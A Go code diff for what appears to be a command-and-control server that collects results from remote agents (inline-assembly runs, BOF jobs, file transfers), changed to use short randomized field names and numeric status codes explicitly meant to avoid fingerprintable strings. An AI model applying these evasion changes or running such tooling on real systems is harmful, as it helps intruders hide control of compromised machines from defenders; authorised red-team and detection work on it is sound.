@@ -75,7 +75,7 @@ func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request,
 		// Legacy: Read and parse JSON body
 		var postData struct {
 			Data    string `json:"data"`
-			AgentID string `json:"agent_id"`
+			AgentID string `json:"ai"`
 		}
 
 		if err := json.NewDecoder(r.Body).Decode(&postData); err != nil {
@@ -146,11 +146,13 @@ func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request,
 	agentID, _ := decryptedData["agent_id"].(string)
 	results, _ := decryptedData["results"].([]interface{})
 
-	// Convert results to expected format
+	// Convert results to expected format, translating randomized field names
 	var resultsMap []map[string]interface{}
 	for _, r := range results {
 		if rm, ok := r.(map[string]interface{}); ok {
-			resultsMap = append(resultsMap, rm)
+			// Translate randomized field names back to standard names
+			translated := conn.TranslateResult(rm)
+			resultsMap = append(resultsMap, translated)
 		}
 	}
 
@@ -263,7 +265,9 @@ func (m *Manager) processResults(ctx context.Context, tx *sql.Tx, agentID string
 
 	for _, result := range results {
 		// Get the command type first to determine how to process
-		command, hasCommand := result["command"].(string)
+		// Use helper to try short name (co) first, then full name (command)
+		command := getResultString(result, "co")
+		hasCommand := command != ""
 
 		// Use if-else chain to ensure only ONE path is taken
 		if hasCommand && strings.HasPrefix(command, "inline-assembly") {
@@ -329,10 +333,10 @@ func (m *Manager) processResults(ctx context.Context, tx *sql.Tx, agentID string
 func (m *Manager) processInlineAssemblyResultOptimized(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}) (*OutputRecord, error) {
 	log.Printf("[Inline-Assembly] Processing inline-assembly result from agent %s", agentID)
 
-	command, _ := result["command"].(string)
-	commandDBID, _ := result["command_db_id"].(float64)
-	output, _ := result["output"].(string)
-	exitCode, _ := result["exit_code"].(float64)
+	command := getResultString(result, "co")
+	commandDBID, _ := getResultFloat(result, "cb")
+	output := getResultString(result, "ou")
+	exitCode, _ := getResultFloat(result, "ec")
 
 	// Check if this is an async result
 	isAsync := strings.Contains(command, "async")
@@ -366,10 +370,10 @@ func (m *Manager) processInlineAssemblyResultOptimized(ctx context.Context, tx *
 func (m *Manager) processInlineAssemblyResult(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}) error {
 	log.Printf("[Inline-Assembly] Processing inline-assembly result from agent %s", agentID)
 
-	command, _ := result["command"].(string)
-	commandDBID, _ := result["command_db_id"].(float64)
-	output, _ := result["output"].(string)
-	exitCode, _ := result["exit_code"].(float64)
+	command := getResultString(result, "co")
+	commandDBID, _ := getResultFloat(result, "cb")
+	output := getResultString(result, "ou")
+	exitCode, _ := getResultFloat(result, "ec")
 
 	// Check if this is an async result
 	isAsync := strings.Contains(command, "async")
@@ -420,12 +424,13 @@ func (m *Manager) processInlineAssemblyResult(ctx context.Context, tx *sql.Tx, a
 
 // processFileOperationResult handles upload/download chunk results
 func (m *Manager) processFileOperationResult(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}, processedChunks map[string]bool) error {
-	filename, _ := result["filename"].(string)
-	currentChunk, _ := result["currentChunk"].(float64)
-	totalChunks, _ := result["totalChunks"].(float64)
-	data, _ := result["data"].(string)
-	command, _ := result["command"].(string)
-	commandDBID, _ := result["command_db_id"].(float64)
+	filename := getResultString(result, "fn")
+	currentChunk, _ := getResultFloat(result, "cc")
+	totalChunks, _ := getResultFloat(result, "tc")
+	data := getResultString(result, "data")
+	command := getResultString(result, "co")
+	commandDBID, _ := getResultFloat(result, "cb")
+	// file_size doesn't have a short name, try both
 	fileSize, _ := result["file_size"].(float64)
 
 	// Validate required fields
@@ -551,15 +556,24 @@ func (m *Manager) processFileOperationResult(ctx context.Context, tx *sql.Tx, ag
 // processRegularCommandResult handles normal command output
 // processRegularCommandResultOptimized - OPTIMIZED version that returns OutputRecord for bulk insert
 func (m *Manager) processRegularCommandResultOptimized(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}) (*OutputRecord, error) {
-	commandDBID, okID := result["command_db_id"].(float64)
-	output, okOutput := result["output"].(string)
+	commandDBID, okID := getResultFloat(result, "cb")
+	output := getResultString(result, "ou")
 
 	if !okID {
 		// Try parsing as json.Number in case it's coming as a string
-		if strID, ok := result["command_db_id"].(string); ok {
+		if strID, ok := result["cb"].(string); ok {
 			if id, err := strconv.ParseFloat(strID, 64); err == nil {
 				commandDBID = id
 				okID = true
+			}
+		}
+		// Also try long name
+		if !okID {
+			if strID, ok := result["command_db_id"].(string); ok {
+				if id, err := strconv.ParseFloat(strID, 64); err == nil {
+					commandDBID = id
+					okID = true
+				}
 			}
 		}
 	}
@@ -568,14 +582,9 @@ func (m *Manager) processRegularCommandResultOptimized(ctx context.Context, tx *
 		return nil, fmt.Errorf("missing or invalid command_db_id in result")
 	}
 
-	if !okOutput {
-		// For some commands, output might be empty, which is okay
-		output = ""
-		okOutput = true
-	}
-
 	// Special handling for BOF_ASYNC messages
-	if strings.HasPrefix(output, "BOF_ASYNC_") {
+	// Detect both legacy format (BOF_ASYNC_*) and new numeric format (1|, 2|, etc.)
+	if isBOFAsyncOutput(output) {
 		// BOF async requires immediate database insert for state management
 		if err := m.processBOFAsyncResult(ctx, tx, agentID, int(commandDBID), output); err != nil {
 			return nil, err
@@ -592,15 +601,24 @@ func (m *Manager) processRegularCommandResultOptimized(ctx context.Context, tx *
 
 // processRegularCommandResult - Original version (DEPRECATED, use processRegularCommandResultOptimized)
 func (m *Manager) processRegularCommandResult(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}) error {
-	commandDBID, okID := result["command_db_id"].(float64)
-	output, okOutput := result["output"].(string)
+	commandDBID, okID := getResultFloat(result, "cb")
+	output := getResultString(result, "ou")
 
 	if !okID {
 		// Try parsing as json.Number in case it's coming as a string
-		if strID, ok := result["command_db_id"].(string); ok {
+		if strID, ok := result["cb"].(string); ok {
 			if id, err := strconv.ParseFloat(strID, 64); err == nil {
 				commandDBID = id
 				okID = true
+			}
+		}
+		// Also try long name
+		if !okID {
+			if strID, ok := result["command_db_id"].(string); ok {
+				if id, err := strconv.ParseFloat(strID, 64); err == nil {
+					commandDBID = id
+					okID = true
+				}
 			}
 		}
 	}
@@ -609,14 +627,9 @@ func (m *Manager) processRegularCommandResult(ctx context.Context, tx *sql.Tx, a
 		return fmt.Errorf("missing or invalid command_db_id in result")
 	}
 
-	if !okOutput {
-		// For some commands, output might be empty, which is okay
-		output = ""
-		okOutput = true
-	}
-
 	// Special handling for BOF_ASYNC messages
-	if strings.HasPrefix(output, "BOF_ASYNC_") {
+	// Detect both legacy format (BOF_ASYNC_*) and new numeric format (1|, 2|, etc.)
+	if isBOFAsyncOutput(output) {
 		return m.processBOFAsyncResult(ctx, tx, agentID, int(commandDBID), output)
 	}
 
@@ -648,32 +661,79 @@ func (m *Manager) processRegularCommandResult(ctx context.Context, tx *sql.Tx, a
 	return nil
 }
 
-// processBOFAsyncResult handles BOF async messages
+// BOF async status codes (numeric format to avoid fingerprintable strings)
+const (
+	bofCodeStarted   = "1"
+	bofCodeCompleted = "2"
+	bofCodeCrashed   = "3"
+	bofCodeKilled    = "4"
+	bofCodeTimeout   = "5"
+	bofCodeOutput    = "6"
+)
+
+// isBOFAsyncOutput detects BOF async messages in both legacy and numeric formats
+func isBOFAsyncOutput(output string) bool {
+	// Legacy format: BOF_ASYNC_*
+	if strings.HasPrefix(output, "BOF_ASYNC_") {
+		return true
+	}
+	// Numeric format: starts with 1-6 followed by |
+	if len(output) >= 2 && output[1] == '|' {
+		code := output[0]
+		return code >= '1' && code <= '6'
+	}
+	return false
+}
+
+// translateBOFCode converts numeric code to human-readable status for logging/display
+func translateBOFCode(code string) string {
+	switch code {
+	case bofCodeStarted, "BOF_ASYNC_STARTED":
+		return "STARTED"
+	case bofCodeCompleted, "BOF_ASYNC_COMPLETED":
+		return "COMPLETED"
+	case bofCodeCrashed, "BOF_ASYNC_CRASHED":
+		return "CRASHED"
+	case bofCodeKilled, "BOF_ASYNC_KILLED":
+		return "KILLED"
+	case bofCodeTimeout, "BOF_ASYNC_TIMEOUT":
+		return "TIMEOUT"
+	case bofCodeOutput, "BOF_ASYNC_OUTPUT":
+		return "OUTPUT"
+	default:
+		return code
+	}
+}
+
+// processBOFAsyncResult handles BOF async messages (both legacy and numeric formats)
 func (m *Manager) processBOFAsyncResult(ctx context.Context, tx *sql.Tx, agentID string, commandDBID int, output string) error {
 	parts := strings.SplitN(output, "|", 3)
 	if len(parts) >= 2 {
-		statusType := parts[0]
+		statusCode := parts[0]
 		jobID := parts[1]
 		message := ""
 		if len(parts) > 2 {
 			message = parts[2]
 		}
 
-		log.Printf("[BOF Async] %s for job %s", statusType, jobID)
+		statusName := translateBOFCode(statusCode)
+		log.Printf("[BOF Async] %s for job %s", statusName, jobID)
 
 		// Format the output nicely for database storage
 		var formattedOutput string
-		switch statusType {
-		case "BOF_ASYNC_STARTED":
+		switch statusCode {
+		case bofCodeStarted, "BOF_ASYNC_STARTED":
 			formattedOutput = fmt.Sprintf("[+] BOF async job started\nJob ID: %s\nBOF: %s", jobID, message)
-		case "BOF_ASYNC_COMPLETED":
+		case bofCodeCompleted, "BOF_ASYNC_COMPLETED":
 			formattedOutput = fmt.Sprintf("[+] BOF async job completed\nJob ID: %s\n\nOutput:\n%s", jobID, message)
-		case "BOF_ASYNC_CRASHED":
+		case bofCodeCrashed, "BOF_ASYNC_CRASHED":
 			formattedOutput = fmt.Sprintf("[-] BOF async job crashed\nJob ID: %s\nError: %s", jobID, message)
-		case "BOF_ASYNC_KILLED":
+		case bofCodeKilled, "BOF_ASYNC_KILLED":
 			formattedOutput = fmt.Sprintf("[!] BOF async job killed\nJob ID: %s", jobID)
-		case "BOF_ASYNC_TIMEOUT":
+		case bofCodeTimeout, "BOF_ASYNC_TIMEOUT":
 			formattedOutput = fmt.Sprintf("[!] BOF async job timeout\nJob ID: %s", jobID)
+		case bofCodeOutput, "BOF_ASYNC_OUTPUT":
+			formattedOutput = fmt.Sprintf("[*] BOF async output\nJob ID: %s\n\nOutput:\n%s", jobID, message)
 		default:
 			formattedOutput = output // Use original if unknown status
 		}
@@ -688,13 +748,20 @@ func (m *Manager) processBOFAsyncResult(ctx context.Context, tx *sql.Tx, agentID
 			return fmt.Errorf("failed to insert BOF async output: %v", err)
 		}
 
-		log.Printf("[BOF Async] Stored BOF async %s output for command ID %d", statusType, commandDBID)
+		log.Printf("[BOF Async] Stored BOF async %s output for command ID %d", statusName, commandDBID)
 
-		// Broadcast the original BOF_ASYNC message so client can parse it
+		// Broadcast with human-readable status for client parsing
+		// Translate numeric codes to legacy format for client compatibility
+		broadcastOutput := output
+		if len(statusCode) == 1 && statusCode[0] >= '1' && statusCode[0] <= '6' {
+			// Convert numeric format to legacy format for client
+			broadcastOutput = "BOF_ASYNC_" + statusName + "|" + strings.Join(parts[1:], "|")
+		}
+
 		commandResult := map[string]interface{}{
 			"agent_id":   agentID,
 			"command_id": fmt.Sprintf("%d", int(commandDBID)),
-			"output":     output, // Send original BOF_ASYNC_* format for client parsing
+			"output":     broadcastOutput,
 			"timestamp":  time.Now().Format(time.RFC3339),
 			"status":     "completed",
 		}
@@ -702,7 +769,7 @@ func (m *Manager) processBOFAsyncResult(ctx context.Context, tx *sql.Tx, agentID
 		if err := m.commandBuffer.BroadcastResult(commandResult); err != nil {
 			log.Printf("[BOF Async] Failed to broadcast BOF result: %v", err)
 		} else {
-			log.Printf("[BOF Async] Successfully broadcast BOF %s for job %s", statusType, jobID)
+			log.Printf("[BOF Async] Successfully broadcast BOF %s for job %s", statusName, jobID)
 		}
 	}
 
